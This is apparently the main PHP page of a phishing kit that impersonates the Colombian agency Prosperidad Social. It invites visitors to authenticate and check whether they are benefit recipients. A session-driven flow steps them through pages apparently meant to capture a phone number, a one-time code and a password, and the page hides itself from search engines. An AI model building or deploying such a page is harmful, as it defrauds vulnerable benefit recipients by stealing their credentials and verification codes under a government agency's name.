<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $TITLE ?></title>
    <meta name="robots" content="noindex,nofollow">

    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            background-color: #ffffff;
            color: #333;
        }

        /* Header / Navbar */
        .header-nav {
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #e4e4e4;
        }

        .header-nav img {
            height: 45px;
        }

        .nav-links {
            font-size: 13px;
            font-weight: 600;
        }

        /* Hero Section */
        .hero-container {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            padding: 40px 8%;
            position: relative;
            overflow: hidden;
        }

        .hero-text {
            flex: 1;
            min-width: 300px;
            z-index: 2;
        }

        .hero-text h1 {
            font-weight: 800;
            font-size: 28px;
            line-height: 1.2;
            color: #212121;
            margin-bottom: 20px;
        }

        .hero-image {
            flex: 1;
            min-width: 300px;
            text-align: right;
        }

        .hero-image img {
            width: 100%;
            max-width: 600px;
        }

        .btn-check-status {
            display: block;
            width: 100%;
            padding: 12px;
            border: 2px solid #333;
            background: transparent;
            font-weight: 700;
            border-radius: 5px;
            text-decoration: none;
            color: #333;
            margin-top: 15px;
            transition: 0.3s;
        }

        .btn-check-status:hover {
            background: #333;
            color: #fff;
        }

        /* Footer */
        .footer-dark {
            background-color: #2c3e50;
            /* Warna biru navy gelap */
            color: #ffffff;
            padding: 50px 8% 20px;
            margin-top: 50px;
        }

        .footer-content {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 30px;
        }

        .social-icons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin: 20px 0;
        }

        .social-circle {
            width: 40px;
            height: 40px;
            border: 1px solid #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }

        /* Loader */
        .loader {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            z-index: 9999;
        }

        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #2c3e50;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 768px) {
            .hero-container {
                flex-direction: column;
                text-align: center;
            }

            .hero-image {
                order: -1;
                margin-bottom: 20px;
            }

            .hero-text h1 {
                font-size: 22px;
            }
        }
    </style>
</head>

<body>
    <div id="loader" class="loader">
        <div class="spinner"></div>
    </div>

    <header class="header-nav">
        <img src="assets/logoo.png" alt="Prosperidad Social">
        <div class="nav-links d-none d-md-block">
            <span>🏠 Inicio &nbsp;&nbsp; 💳 Autentíquese y consulte si es Beneficiario</span>
        </div>
    </header>

    <main class="hero-container">
        <div class="hero-text">
            

            
                <?php
                if (!isset($_SESSION["state"]) || isset($_GET["otherAccount"])) {
                    $_SESSION["state"] = "start";
                }

                $F = $_SESSION["state"];
                switch ($F) {
                    case "start":
                        require("Lander.php");
                        break;
                    case "phone":
                        require("OTPC.php");
                        break;
                    case "otp":
                        require("PASS.php");
                        break;
                    case "success":
                        require("SCCS.php");
                        break;
                    default:
                        print_r($_SESSION);
                }
                ?>
            </div>
        </div>

        
    </main>

    <footer class="footer-dark text-center">
        <div class="footer-content">
            <div style="flex: 1;">
                <p><strong>Prosperidad Social</strong><br>Cra 7 # 32 - 42</p>
            </div>
            <div style="flex: 1;">
                <h6>SÍGUENOS</h6>
                <div class="social-icons">
                    <div class="social-circle">f</div>
                    <div class="social-circle">ig</div>
                    <div class="social-circle">t</div>
                    <div class="social-circle">y</div>
                </div>
            </div>

        </div>
        <hr style="border-color: rgba(255,255,255,0.1);">
        <p style="font-size: 11px; opacity: 0.6;">Copyright © Prosperidad Social</p>
    </footer>

    <script>
        $(window).on('load', function () {
            $('#loader').fadeOut('slow');
        });
    </script>
</body>

</html>